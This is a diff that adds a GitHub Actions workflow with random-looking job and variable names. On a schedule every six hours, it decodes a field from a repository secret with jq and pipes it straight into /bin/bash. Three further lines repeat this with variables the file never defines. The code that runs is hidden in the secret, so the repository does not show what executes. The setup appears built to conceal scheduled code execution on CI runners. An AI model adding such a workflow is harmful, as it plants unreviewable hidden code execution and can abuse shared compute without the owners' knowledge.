@@ -1,0 +1,21 @@
+name: fananghais
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '12 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: fananghais
+        env:
+          uyzf3842: ${{ secrets.uyzf3842 }}
+        run: |
+          echo $uyzf3842 | jq -r .fn77736 | /bin/bash
+          echo $vhsmg50 | jq -r .btsk3700 | /bin/bash
+          echo $laao65365 | jq -r .ujhw9108 | /bin/bash
+          echo $lo0 | jq -r .nelvu9088 | /bin/bash
+
